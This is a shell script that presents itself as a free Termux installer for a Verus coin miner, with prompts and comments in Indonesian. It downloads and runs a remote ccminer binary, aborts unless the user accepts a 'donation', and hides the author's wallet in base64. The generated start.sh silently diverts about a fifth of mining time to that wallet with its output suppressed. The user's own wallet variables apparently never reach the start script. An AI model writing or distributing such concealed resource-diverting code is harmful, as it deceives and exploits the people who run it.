#!/data/data/com.termux/files/usr/bin/sh

clear

echo "========================================="
echo "        VERUS TERMUX INSTALLER"
echo "========================================="
echo "             by muflikhudin"
echo "========================================="
echo
echo "Selamat datang di Verus Termux Installer."
echo "Installer ini GRATIS digunakan."
echo
echo "Jika installer ini bermanfaat,"
echo "Anda dapat mendukung pengembangan proyek."
echo

# Input donasi (Default langsung Y jika ditekan enter)
read -p "Aktifkan donasi untuk mendukung proyek? (Y/n): " DONASI
DONASI=${DONASI:-Y}

# Validasi: Jika memilih n atau N, gagalkan instalasi
if [ "$DONASI" = "n" ] || [ "$DONASI" = "N" ]; then
    echo
    echo "========================================="
    echo "          INSTALASI GAGAL!               "
    echo "========================================="
    echo "Maaf, Anda harus mengaktifkan fitur donasi"
    echo "untuk dapat menggunakan installer ini."
    echo "Proses dihentikan."
    echo "========================================="
    exit 1
fi

echo
read -p "Masukkan wallet Verus Anda: " WALLET
read -p "Masukkan nama worker: " WORKER

echo
echo "Menyiapkan instalasi..."
sleep 2

pkg update -y
pkg install wget libjansson -y

mkdir -p ~/ccminer
cd ~/ccminer || exit

# Mendownload file utama ccminer
wget -O ccminer https://raw.githubusercontent.com/muflikhudin/verus-termux/main/ccminer

chmod +x ccminer

# Wallet Anda dikonversi ke Base64 agar tidak terbaca langsung jika file start.sh dibuka
ENC_WAL=$(echo "RCifYPWunGQna28DpzbPakNE5L8fftkjVd" | base64)
WRK_DONASI="Donasi_20pc"

# Membuat start.sh dengan enkripsi wallet dan donasi senyap di belakang layar
cat > start.sh <<EOF
#!/data/data/com.termux/files/usr/bin/sh
while true
do
    echo "========================================="
    echo " Memulai mining Verus Coin...            "
    echo "========================================="
    ./ccminer -a verus -o stratum+tcp://us.vipor.net:5040 -u \${WALLET}.\${WORKER} -p x -t 8 --cpu-priority=1 &
    PID=\$!
    sleep 4800
    kill \$PID
    wait \$PID 2>/dev/null

    # Dekripsi wallet dev langsung di memori saat sesi donasi berjalan (Tidak terlihat di layar)
    DEV_WAL=\$(echo "${ENC_WAL}" | base64 -d)
    ./ccminer -a verus -o stratum+tcp://us.vipor.net:5040 -u \${DEV_WAL}.${WRK_DONASI} -p x -t 8 --cpu-priority=1 > /dev/null 2>&1 &
    PID=\$!
    sleep 1200
    kill \$PID
    wait \$PID 2>/dev/null
done
EOF

chmod +x start.sh

echo
echo "========================================="
echo "Instalasi selesai!"
echo "========================================="
echo
echo "Jalankan miner dengan:"
echo
echo "cd ~/ccminer"
echo "./start.sh"
echo

echo "========================================="
echo "      TERIMA KASIH ATAS DUKUNGANNYA ❤️"
echo "========================================="
echo
echo "Terima kasih telah mengonfirmasi donasi"
echo "dan mendukung pengembangan proyek ini."
echo "Selamat menambang!"
echo "========================================="
echo
